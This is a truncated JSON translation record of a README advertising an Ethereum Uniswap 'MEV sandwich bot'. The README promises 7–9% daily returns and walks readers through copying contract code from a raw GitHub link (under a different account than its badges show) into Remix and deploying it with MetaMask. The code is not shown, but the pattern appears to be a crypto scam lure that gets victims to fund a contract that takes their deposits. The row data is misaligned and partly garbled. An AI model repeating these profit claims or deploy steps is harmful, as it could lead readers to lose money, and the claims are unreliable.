[
  {
    "Id": 1,
    "Content": "\n# ü•™ Ethereum Uniswap MEV. Sandwich Bot (DeFi)\n![Bot Controls](https://imgur.com/Z5aVSek.png)\n\n<div align=\"center\">\n<i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>\n</div>\n\n<div align=\"center\">\n  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">\n    <img src=\"https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub stars\" />\n  </a>\n  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">\n    <img src=\"https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub forks\" />\n  </a>\n  <a href=\"https://github.com/ntkme/github-buttons/workflows/build\">\n    <img src=\"https://github.com/ntkme/github-buttons/workflows/build/badge.svg\" alt=\"build\" />\n  </a>\n</div>\n\n<div align=\"center\">\n  <img src=\"https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white\" alt=\"Ethereum\" />\n  <img src=\"https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white\" alt=\"Solidity\" />\n</div>\n\n## üìä Current Performance\n\n- **Avg. Daily Return**: 7‚Äì9% on deployed capital (varies with market volatility).\n- **Minimum Capital Requirement**: 0.5 ETH (under current gas and liquidity conditions).\n- **Note**: Profitability depends on network congestion, competition, and pool liquidity.\n- **Disclaimer**: No guarantees. Past performance does not predict future results.\n\n---\n\n## üìà Latest Profitable Transactions\n\n**Last Updated**: 2025-04-19\n\nBelow are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.\n\n| Tx Hash                                                                 | Block    | Profit (ETH) | Timestamp           |\n|-------------------------------------------------------------------------|----------|--------------|---------------------|\n| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |\n| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |\n| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |\n| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |\n| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |\n\n---\n\n## üìö How This Bot Works\n\nThis bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:\n\n1. Buys the target asset before the large swap.\n2. Waits for the target swap to shift the asset‚Äôs price.\n3. Sells the asset at the optimized price.\n\nThe bot can perform multiple transactions if necessary to capture an opportunity.\n\n---\n\n## ‚ú® Features\n\n- Automatically monitors the Ethereum mempool and executes MEV strategies.\n- Dynamic gas pricing to remain competitive.\n- Built-in reverts for failed transactions and profit thresholds to filter unprofitable trades.\n- Open-source and modular codebase for tweaking strategies (e.g., profit thresholds, gas multipliers, etc.).\n\n---\n\n## ‚ö° How to Run the Bot\n\n### 1. Install a Wallet\nDownload and set up [MetaMask](https://metamask.io/download.html) or any other EVM-compatible wallet.\n\n### 2. Open Remix\nAccess [Remix - Ethereum IDE](https://remix.ethereum.org), a web-based environment for writing, compiling, and deploying Ethereum smart contracts.\n\n### 3. Create a New File\nüìÅ Create a new file in Remix and name it, e.g., `bot.sol`.\n\n![Create New File](https://i.imgur.com/1XiPUes.png)\n\n### 4. Paste the Code\nüìã Copy the [bot code](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol) from GitHub and paste it into your newly created Remix file.\n\n### 5. Compile the Contract\nüîß Go to the `Solidity Compiler` tab, select version `0.6.6+commit`, and click `Compile bot.sol`.\n\n![Compile Contract](https://i.imgur.com/s5OAv6g.png)\n\n### 6. Deploy the Bot\nüöÄ Navigate to the `Deploy & Run Transactions` tab, select the `Injected Provider - MetaMask` environment, and click `Deploy`. Approve the MetaMask contract creation fee to deploy your MEV bot.\n\n![Deploy Contract](https://i.imgur.com/2odZQNj.png)\n\n---\n\n## ‚öôÔ∏è Configuration",
    "ContentSha": "aGpWN3nVR78nvFRzV0y0L2v9AeOlswmCQ4HeVPEpc9U=",
    "SectionType": "",
    "StartLine": 0,
    "EndLine": 0,
    "Translation": "# ü•™ Ethereum Uniswap MEV. Sandwich Bot (DeFi)\n![Bot Controls](https://imgur.com/Z5aVSek.png)\n\n<div align=\"center\">\n<i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>\n</div>\n\n<div align=\"center\">\n  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">\n    <img src=\"https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub stars\" />\n  </a>\n  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">\n    <img src=\"https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub forks\" />\n  </a>\n  <a href=\"https://github.com/ntkme/github-buttons/workflows/build\">\n    <img src=\"https://github.com/ntkme/github-buttons/workflows/build/badge.svg\" alt=\"build\" />\n  </a>\n</div>\n\n<div align=\"center\">\n  <img src=\"https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white\" alt=\"Ethereum\" />\n  <img src=\"https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white\" alt=\"Solidity\" />\n</div>\n\n## üìä Current Performance\n\n- **Avg. Daily Return**: 7‚Äì9% on deployed capital (varies with market volatility).\n- **Minimum Capital Requirement**: 0.5 ETH (under current gas and liquidity conditions).\n- **Note**: Profitability depends on network congestion, competition, and pool liquidity.\n- **Disclaimer**: No guarantees. Past performance does not predict future results.\n\n---\n\n## üìà Latest Profitable Transactions\n\n**Last Updated**: 2025-04-19\n\nBelow are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.\n\n| Tx Hash                                                                 | Block    | Profit (ETH) | Timestamp           |\n|-------------------------------------------------------------------------|----------|--------------|---------------------|\n| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |\n| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |\n| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |\n| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |\n| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |\n\n---\n\n## üìö How This Bot Works\n\nThis bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:\n\n1. Buys the target asset before the large swap.\n2. Waits for the target swap to shift the asset‚Äôs price.\n3. Sells the asset at the optimized price.\n\nThe bot can perform multiple transactions if necessary to capture an opportunity.\n\n---\n\n## ‚ú® Features\n\n- Automatically monitors the Ethereum mempool and executes MEV strategies.\n- Dynamic gas pricing to remain competitive.\n- Built-in reverts for failed transactions and profit thresholds to filter unprofitable trades.\n- Open-source and modular codebase for tweaking strategies (e.g., profit thresholds, gas multipliers, etc.).\n\n---\n\n## ‚ö° How to Run the Bot\n\n### 1. Install a Wallet\nDownload and set up [MetaMask](https://metamask.io/download.html) or any other EVM-compatible wallet.\n\n### 2. Open Remix\nAccess [Remix - Ethereum IDE](https://remix.ethereum.org), a web-based environment for writing, compiling, and deploying Ethereum smart contracts.\n\n### 3. Create a New File\nüìÅ Create a new file in Remix and name it, e.g., `bot.sol`.\n\n![Create New File](https://i.imgur.com/1XiPUes.png)\n\n### 4. Paste the Code\nüìã Copy the [bot code](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol) from GitHub and paste it into your newly created Remix file.\n\n### 5. Compile the Contract\nüîß Go to the `Solidity Compiler` tab, select version `0.6.6+commit`, and click `Compile bot.sol`.\n\n![Compile Contract](https://i.imgur.com/s5OAv6g.png)\n\n### 6. Deploy the Bot\nüöÄ Navigate to the `Deploy & Run Transactions` tab, select the `Injected Provider - MetaMask` environment, and click `Deploy`. Approve the MetaMask contract creation fee to deploy your MEV bot.\n\n![Deploy Contract](https://i.imgur.com/2odZQNj.png)\n\n---\n\n## ‚öôÔ∏è Configuration\n",
    "Status": "ok",
    "RowTranslations": [
      {
        "row": 1,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "# ü•™ Ethereum Uniswap MEV. Sandwich Bot (DeFi)"
      },
      {
        "row": 2,
        "rowsha": "XCh7qgHPUe3S0XraOQUKhGmBfNMVVNpmTWBxwc/fZb4=",
        "originContent": "# ü•™ Ethereum Uniswap MEV. Sandwich Bot (DeFi)",
        "translatedContent": "![Bot Controls](https://imgur.com/Z5aVSek.png)"
      },
      {
        "row": 3,
        "rowsha": "Ibrp2tBmO6rY2h8NvnW9bNdpCzMupzPpLdd8FX5POq0=",
        "originContent": "![Bot Controls](https://imgur.com/Z5aVSek.png)",
        "translatedContent": ""
      },
      {
        "row": 4,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "<div align=\"center\">"
      },
      {
        "row": 5,
        "rowsha": "94MDjHJY1ZLwHNTLIEUIfk7TMc9cq1L/1FmwhqBTe/k=",
        "originContent": "<div align=\"center\">",
        "translatedContent": "<i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>"
      },
      {
        "row": 6,
        "rowsha": "/eqzykWb94N+0P89/ElQerKXYuzYjeMgcMn7al4GqtE=",
        "originContent": "<i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>",
        "translatedContent": "</div>"
      },
      {
        "row": 7,
        "rowsha": "qsMmUbEPVnxGG5tPJV1vsfpoWbU2jYvZpRr5IKshzyM=",
        "originContent": "</div>",
        "translatedContent": ""
      },
      {
        "row": 8,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "<div align=\"center\">"
      },
      {
        "row": 9,
        "rowsha": "94MDjHJY1ZLwHNTLIEUIfk7TMc9cq1L/1FmwhqBTe/k=",
        "originContent": "<div align=\"center\">",
        "translatedContent": "  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">"
      },
      {
        "row": 10,
        "rowsha": "+BprsyjVI9ZF9RR9qVy2wiOJk/9gOC5RkU0b1Ci8sGg=",
        "originContent": "  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">",
        "translatedContent": "    <img src=\"https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub stars\" />"
      },
      {
        "row": 11,
        "rowsha": "A3EeX6azZ1P/GgXF/EVy4IQ60pvxr0bTh3fYVD/4IzA=",
        "originContent": "    <img src=\"https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub stars\" />",
        "translatedContent": "  </a>"
      },
      {
        "row": 12,
        "rowsha": "7Sl5c7caJ7+Yt222Hl2I2PLtk1UIeh8Qfn02MNONw0Y=",
        "originContent": "  </a>",
        "translatedContent": "  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">"
      },
      {
        "row": 13,
        "rowsha": "+BprsyjVI9ZF9RR9qVy2wiOJk/9gOC5RkU0b1Ci8sGg=",
        "originContent": "  <a href=\"https://github.com/Calindra54z05L/Mev-Bot-Uniswap\">",
        "translatedContent": "    <img src=\"https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub forks\" />"
      },
      {
        "row": 14,
        "rowsha": "XV6RNMy4XzG/D1pHp08FLqAqFreoGEfB2gs3GARfY4g=",
        "originContent": "    <img src=\"https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social\" alt=\"GitHub forks\" />",
        "translatedContent": "  </a>"
      },
      {
        "row": 15,
        "rowsha": "7Sl5c7caJ7+Yt222Hl2I2PLtk1UIeh8Qfn02MNONw0Y=",
        "originContent": "  </a>",
        "translatedContent": "  <a href=\"https://github.com/ntkme/github-buttons/workflows/build\">"
      },
      {
        "row": 16,
        "rowsha": "ccckhDERpIU31HYuc2ySzVWVRwzVfXEjTJeWyRaUByg=",
        "originContent": "  <a href=\"https://github.com/ntkme/github-buttons/workflows/build\">",
        "translatedContent": "    <img src=\"https://github.com/ntkme/github-buttons/workflows/build/badge.svg\" alt=\"build\" />"
      },
      {
        "row": 17,
        "rowsha": "CQYvMRyePlkO6YK7/i/Kv4JyTCTuZzIbPNJygh/c/Cg=",
        "originContent": "    <img src=\"https://github.com/ntkme/github-buttons/workflows/build/badge.svg\" alt=\"build\" />",
        "translatedContent": "  </a>"
      },
      {
        "row": 18,
        "rowsha": "7Sl5c7caJ7+Yt222Hl2I2PLtk1UIeh8Qfn02MNONw0Y=",
        "originContent": "  </a>",
        "translatedContent": "</div>"
      },
      {
        "row": 19,
        "rowsha": "qsMmUbEPVnxGG5tPJV1vsfpoWbU2jYvZpRr5IKshzyM=",
        "originContent": "</div>",
        "translatedContent": ""
      },
      {
        "row": 20,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "<div align=\"center\">"
      },
      {
        "row": 21,
        "rowsha": "94MDjHJY1ZLwHNTLIEUIfk7TMc9cq1L/1FmwhqBTe/k=",
        "originContent": "<div align=\"center\">",
        "translatedContent": "  <img src=\"https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white\" alt=\"Ethereum\" />"
      },
      {
        "row": 22,
        "rowsha": "eVdvah7br0kzi+t4GDIqOsUxu8PqS/o4W7q2N/5kH9o=",
        "originContent": "  <img src=\"https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white\" alt=\"Ethereum\" />",
        "translatedContent": "  <img src=\"https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white\" alt=\"Solidity\" />"
      },
      {
        "row": 23,
        "rowsha": "mKZKfF4mpN5R6Jc1FFSXrFy3qjwE744UBfUxDNc5obo=",
        "originContent": "  <img src=\"https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white\" alt=\"Solidity\" />",
        "translatedContent": "</div>"
      },
      {
        "row": 24,
        "rowsha": "qsMmUbEPVnxGG5tPJV1vsfpoWbU2jYvZpRr5IKshzyM=",
        "originContent": "</div>",
        "translatedContent": ""
      },
      {
        "row": 25,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## üìä Current Performance"
      },
      {
        "row": 26,
        "rowsha": "ICWvGsuSwdWcBKmdKpIkFQxpRuPVnZRuFtztzUEyDJk=",
        "originContent": "## üìä Current Performance",
        "translatedContent": ""
      },
      {
        "row": 27,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "- **Avg. Daily Return**: 7‚Äì9% on deployed capital (varies with market volatility)."
      },
      {
        "row": 28,
        "rowsha": "cWH/xfga/ngfwkqyC7fQm8ReZrrroFMm5p+B4KUrOEE=",
        "originContent": "- **Avg. Daily Return**: 7‚Äì9% on deployed capital (varies with market volatility).",
        "translatedContent": "- **Minimum Capital Requirement**: 0.5 ETH (under current gas and liquidity conditions)."
      },
      {
        "row": 29,
        "rowsha": "5d+JkmPUYfAni8jyw3ybycsXue67b7Pcs5V9QLmYyIo=",
        "originContent": "- **Minimum Capital Requirement**: 0.5 ETH (under current gas and liquidity conditions).",
        "translatedContent": "- **Note**: Profitability depends on network congestion, competition, and pool liquidity."
      },
      {
        "row": 30,
        "rowsha": "RRJVTpNrby+CfBDIr55LwxDZWcYNtPSAbg4eplKfX/E=",
        "originContent": "- **Note**: Profitability depends on network congestion, competition, and pool liquidity.",
        "translatedContent": "- **Disclaimer**: No guarantees. Past performance does not predict future results."
      },
      {
        "row": 31,
        "rowsha": "FrLILTIq+TpeUISuLb4Sgi5RxSpkjiY4TEmSm0KEhHI=",
        "originContent": "- **Disclaimer**: No guarantees. Past performance does not predict future results.",
        "translatedContent": ""
      },
      {
        "row": 32,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 33,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 34,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## üìà Latest Profitable Transactions"
      },
      {
        "row": 35,
        "rowsha": "61wMug++q0sQ5Reie/7VfiaAhl9cyDKCg8cP8vjm2og=",
        "originContent": "## üìà Latest Profitable Transactions",
        "translatedContent": ""
      },
      {
        "row": 36,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "**Last Updated**: 2025-04-19"
      },
      {
        "row": 37,
        "rowsha": "IeXZBHDGGQi8L53ZF+dtUkDDRcPHgm4jhBO2mD84Mqs=",
        "originContent": "**Last Updated**: 2025-04-19",
        "translatedContent": ""
      },
      {
        "row": 38,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "Below are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH."
      },
      {
        "row": 39,
        "rowsha": "+jHB1YQDpH5Q+oIR6hTsWYM74QbZ5XsJOhX9gQPvHsU=",
        "originContent": "Below are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.",
        "translatedContent": ""
      },
      {
        "row": 40,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "| Tx Hash                                                                 | Block    | Profit (ETH) | Timestamp           |"
      },
      {
        "row": 41,
        "rowsha": "tMNH09D0O+20Hy4bRKQonVTbDOMdfJ1XWvvdF1Hzus0=",
        "originContent": "| Tx Hash                                                                 | Block    | Profit (ETH) | Timestamp           |",
        "translatedContent": "|-------------------------------------------------------------------------|----------|--------------|---------------------|"
      },
      {
        "row": 42,
        "rowsha": "eL+iy0KY+IX5NHYOSeqNiCHC4aPSwJm7rGRy7osPHNw=",
        "originContent": "|-------------------------------------------------------------------------|----------|--------------|---------------------|",
        "translatedContent": "| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |"
      },
      {
        "row": 43,
        "rowsha": "A7ZHyaHS1QwG+U/Rv3ORxpApPTLVQHmEr6MmyXpD1tI=",
        "originContent": "| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |",
        "translatedContent": "| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |"
      },
      {
        "row": 44,
        "rowsha": "Coelp4B77OjNgqXGaRTqPqWnwPMsi6MrXyiE6FR941g=",
        "originContent": "| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |",
        "translatedContent": "| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |"
      },
      {
        "row": 45,
        "rowsha": "6mg2OvqVa4jJJ5Sg/vWUymperrjWNFDDj50C4eu8nMU=",
        "originContent": "| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |",
        "translatedContent": "| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |"
      },
      {
        "row": 46,
        "rowsha": "RwcIlQ+fwuYz09bvlIHWpLwFRcb1Q4qrFhFaKTa+Ezc=",
        "originContent": "| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |",
        "translatedContent": "| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |"
      },
      {
        "row": 47,
        "rowsha": "KEfRuPuFWLePr0RBhLch1111r6u/wnMWtlX3hzhuKEQ=",
        "originContent": "| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |",
        "translatedContent": ""
      },
      {
        "row": 48,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 49,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 50,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## üìö How This Bot Works"
      },
      {
        "row": 51,
        "rowsha": "lbcZK3VSvu3ZeqrfOhtG9U14gWzDGqV2sn/Hk/RZwn8=",
        "originContent": "## üìö How This Bot Works",
        "translatedContent": ""
      },
      {
        "row": 52,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "This bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:"
      },
      {
        "row": 53,
        "rowsha": "fY2nw0iKyWCFDksvPpORZhCW5b0LGImTGey/ATObzmg=",
        "originContent": "This bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:",
        "translatedContent": ""
      },
      {
        "row": 54,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "1. Buys the target asset before the large swap."
      },
      {
        "row": 55,
        "rowsha": "Vk/Koq5xX8NEKv5M9ky+s/kCEX8s3jli1NjiWl0sDo8=",
        "originContent": "1. Buys the target asset before the large swap.",
        "translatedContent": "2. Waits for the target swap to shift the asset‚Äôs price."
      },
      {
        "row": 56,
        "rowsha": "HnT73qozUsHInmBMThAgKjEnHILg1M7MTSULTVsggDE=",
        "originContent": "2. Waits for the target swap to shift the asset‚Äôs price.",
        "translatedContent": "3. Sells the asset at the optimized price."
      },
      {
        "row": 57,
        "rowsha": "B0L8cVEvTHVEDlmPL/KjcthrYOwh2E+OVqnbKbmvgUM=",
        "originContent": "3. Sells the asset at the optimized price.",
        "translatedContent": ""
      },
      {
        "row": 58,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "The bot can perform multiple transactions if necessary to capture an opportunity."
      },
      {
        "row": 59,
        "rowsha": "lHr415H0dSxlCK/rQTEatiq2ABBLnCq9TPSOK5bK64o=",
        "originContent": "The bot can perform multiple transactions if necessary to capture an opportunity.",
        "translatedContent": ""
      },
      {
        "row": 60,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 61,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 62,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## ‚ú® Features"
      },
      {
        "row": 63,
        "rowsha": "VzDxHMl0vKby6BK5RJlfHxPFit1vMlpPiL5Nfi50CNE=",
        "originContent": "## ‚ú® Features",
        "translatedContent": ""
      },
      {
        "row": 64,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "- Automatically monitors the Ethereum mempool and executes MEV strategies."
      },
      {
        "row": 65,
        "rowsha": "lqClb23ZM5VRKqAz1kZBfgj1dMfEp0P4fp/tLi3YmbY=",
        "originContent": "- Automatically monitors the Ethereum mempool and executes MEV strategies.",
        "translatedContent": "- Dynamic gas pricing to remain competitive."
      },
      {
        "row": 66,
        "rowsha": "TS80Se2B7AbGhcAKHPLR5iqS7TqHmxojVKMN+vwuCY8=",
        "originContent": "- Dynamic gas pricing to remain competitive.",
        "translatedContent": "- Built-in reverts for failed transactions and profit thresholds to filter unprofitable trades."
      },
      {
        "row": 67,
        "rowsha": "OdyRwrqmJT21Hk7s9mVf0jH7vtfiovLSR27I4c8TR6s=",
        "originContent": "- Built-in reverts for failed transactions and profit thresholds to filter unprofitable trades.",
        "translatedContent": "- Open-source and modular codebase for tweaking strategies (e.g., profit thresholds, gas multipliers, etc.)."
      },
      {
        "row": 68,
        "rowsha": "9rok3uzeAWbgbFoMXzXwMW3fUcP6zBPCUm1zhmiT21o=",
        "originContent": "- Open-source and modular codebase for tweaking strategies (e.g., profit thresholds, gas multipliers, etc.).",
        "translatedContent": ""
      },
      {
        "row": 69,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "---"
      },
      {
        "row": 70,
        "rowsha": "yz+R1U7uMOU+NbK5mQX3Dxae1Un9eJCdPawt78ntjTs=",
        "originContent": "---",
        "translatedContent": ""
      },
      {
        "row": 71,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "## ‚ö° How to Run the Bot"
      },
      {
        "row": 72,
        "rowsha": "ftIPDivWJdV6RTBUdZhavi5Qd6+R+V711l1Y1USBMLA=",
        "originContent": "## ‚ö° How to Run the Bot",
        "translatedContent": ""
      },
      {
        "row": 73,
        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
        "originContent": "",
        "translatedContent": "### 1. Install a Wallet"
      },
      {
        "row": 74,
        "rowsha": "tagX22F5gcfkPDqx4+59QhW9RnhH+7TGYJtTqj8jEpE=",
        "originContent": "### 1. Install a Wallet",
        "translatedContent": "Download and set up [MetaMask](https://metamask.io/download.html) or any other EVM-compatible wallet."
      },
      {
        "row": 75,
        "rowsha": "aJbVBwp8ljzeqzWIK1Oqn7SR7nLziWnVhlU01QdFvIw=",
        "originContent": "Download and set up [MetaMask](https://metamask.io/download.html) or any other EVM-compatible wallet.",
        "translatedContent": ""
      },
      {
        "row": 76,
